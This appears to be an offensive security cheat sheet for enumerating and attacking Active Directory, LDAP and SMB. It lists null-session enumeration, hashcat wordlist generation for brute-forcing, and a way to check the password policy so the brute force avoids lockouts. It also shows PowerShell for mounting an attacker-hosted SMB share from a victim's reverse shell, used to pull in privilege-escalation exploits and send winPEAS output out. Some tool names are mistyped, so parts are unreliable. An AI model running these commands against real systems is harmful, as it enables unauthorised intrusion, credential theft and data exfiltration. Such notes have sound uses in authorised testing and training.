This file is for enumerating Active Directory/LDAP and SMB.

[*] Use to enumerate smb:
        rpcclient -U '' <IP addr>
            enumdomusers
            querydispinfo
            queryuser <RID id, like 0x045>
        crackmapexec smb <ip addr> -u '' -p '' --shares
        crackmapexec smb <ip addr> -u '<username>' -p '<password>'
        crackmapexec winrm <ip addr> -u '<username>' -p '<password>'
        smbclient -U '' -L //<ip addr>

[*] Create random password list with known words:
        hashcat --force <password file> -r /usr/share/hashcat/rules/best64.rule --stdout > <file name>

[*] Attempt to figure out the password policy - avoid lockout on bruteforce
    crackmapexec smb <IP addr> --password-pol

[*] Use to enumerate LDAP/AD:
        ldapsearch -x -h <ip addr> -s base namingcontexts
        ldapsearch -x -h <ip addr> -s sub -b '<DC=domain,DC=com>'

[*] spin up an smb server on Kali - transfer files to/from Windows and Kali
        sudo impact-smbserver -smb2support <share-name> </path/to/share>
        sudo impact-smbserver -smb2support iamawesomeshare $(pwd)
        sudo impact-smbserver -username iamusername -password iampassword IamSomeShare $(pwd)

[*] Once a shell has spawned on victim, create a mountable share (must use PowerShell)
        $pass = "iampassword" | ConvertTo-SecureString -AsPlainText -Force
        $pass # We should see some type of System.Security.Securestring
        $cred = New-Object System.Management.Automation.PsCredential('iamsomeusername', $pass)
        $cred # We should get our object printed with password as System.Security.SecureString
        New-PSDrive -name iamusername -root \\10.10.10.10\IamSomeShare -Credential $cred -PSProvider "filesystem"
             Go back to your Kali machine, scp/rsync your priv esc scripts or exploits to the smb share directory.
             Go bck to your Windows reverse shell and start attacking.
        .\winPEAS.exe cmd fat > winPEASfast.txt
             This is now in your smb share, stored on your Kali machine

[*] Useful smb commands for connecting
	smbclient -N //10.10.10.10/share
	smbclient -U anonymous //10.10.10.10/share
